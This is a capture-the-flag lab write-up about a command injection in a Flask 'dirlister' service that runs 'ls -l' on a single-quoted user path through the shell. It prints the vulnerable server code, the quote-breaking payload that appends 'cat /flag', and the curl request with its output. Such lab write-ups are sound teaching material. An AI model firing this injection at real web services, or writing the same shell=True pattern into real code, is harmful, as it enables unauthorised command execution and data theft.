## Exercise
An interesting thing about command injection is that you don't get to choose where in the command the injection occurs: the developer accidentally makes that choice for you when writing the program. Sometimes, these injections occur in uncomfortable places. Consider the following:

```python
os.system(f"echo Hello '{word}'")
```

Here, the developer tried to convey to the shell that `word` should really be only one word. The shell, when given arguments in single quotes, treats otherwise-special characters like `;`, `$`, and so on as just normal characters, until it hits the closing single quote (`'`).

This level gives you this scenario. Can you bypass it?

## Solution
Let's check the permissions on the server:
```
> ls -la /
drwxr-xr-x    1 root root 4096 Aug 29 10:09 challenge
-r--------    1 root root   60 Aug 29 10:09 flag

> ls -la /challenge/
-rwsr-xr-x 1 root root  928 Jan 27  2025 DESCRIPTION.md
-rwsr-xr-x 1 root root 1170 Sep  6  2025 server
```
Ok we are allowed to read and execute the challenge files. Therefore let's take a look at the server file:
```
> cat /challenge/server

#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/quest", methods=["GET"])
def challenge():
    arg = flask.request.args.get("path", "/challenge")
    command = f"ls -l '{arg}'"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/quest"><input type=text name=path><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
Ok it receives GET requests at /quest and takes arguments for "path=arg". The command stores the argument like this: f"ls -l '{arg}'" whereby arg is our input. Let's try to bring it in a form where we can receive our flag.
f"ls -l '{arg}'" -> f"ls -l '{' ; cat /flag -- }'
I think we should close the ' character as fast as possible even if it throws an error and afterwards we print our flag and set the end of options after /flag.
So what needs to be inputted:
```
' ; cat /flag -- 
encoded:
%27%20%3B%20cat%2Fflag%20%2D%2D%20
```
Therefore let's try following command:
```
> curl -L -v "http://challenge.localhost:80/quest?path=/%27%20%3B%20cat%20%2Fflag%20%2D%2D%20%27"

* Host challenge.localhost:80 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:80...
* connect to ::1 port 80 from ::1 port 55196 failed: Connection refused
*   Trying 127.0.0.1:80...
* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 41756
* using HTTP/1.x
> GET /quest?path=/%27%20%3B%20cat%20%2Fflag%20%2D%2D%20%27 HTTP/1.1
> Host: challenge.localhost
> User-Agent: curl/8.21.0
> Accept: */*
>
* Request completely sent off
DEBUG: command="ls -l '/' ; cat /flag -- ''"
127.0.0.1 - - [29/Aug/2026 10:31:18] "GET /quest?path=/'%20;%20cat%20/flag%20--%20' HTTP/1.1" 200 -
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Sat, 29 Aug 2026 10:31:18 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 1682
< Connection: close
<

        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/quest"><input type=text name=path><input type=submit value=Submit></form>
        <hr>
        <b>Output of ls -l '/' ; cat /flag -- '':</b><br>
        <pre>total 64
lrwxrwxrwx    1 root root    7 Apr  4  2025 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
drwxr-xr-x    1 root root 4096 Aug 29 10:09 challenge
drwxr-xr-x    6 root root  380 Aug 29 10:09 dev
drwxr-xr-x    1 root root 4096 Aug 29 10:09 etc
-r--------    1 root root   60 Aug 29 10:09 flag
drwxr-xr-x    1 root root 4096 Feb 23  2026 home
lrwxrwxrwx    1 root root    7 Apr  4  2025 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Apr  4  2025 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Apr  4  2025 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Apr  4  2025 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Apr  4  2025 media
drwxr-xr-x    2 root root 4096 Apr  4  2025 mnt
drwxr-xr-x    1 root root   16 Oct 26  2024 nix
drwxr-xr-x    1 root root 4096 Feb 23  2026 opt
dr-xr-xr-x 2461 root root    0 Aug 29 10:09 proc
drwx------    1 root root 4096 Feb 23  2026 root
drwxr-xr-x    1 root root 4096 Aug 29 10:09 run
lrwxrwxrwx    1 root root    8 Apr  4  2025 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Apr  4  2025 srv
dr-xr-xr-x   13 root root    0 Jun 27 20:53 sys
drwxrwxrwt    1 root root 4096 Aug 29 10:09 tmp
drwxr-xr-x    1 root root 4096 Feb 23  2026 usr
drwxr-xr-x    1 root root 4096 Feb 23  2026 var
pwn.college{[REDACTED FLAG]}
cat: '': No such file or directory
</pre>
        </body></html>
* shutting down connection #0
```
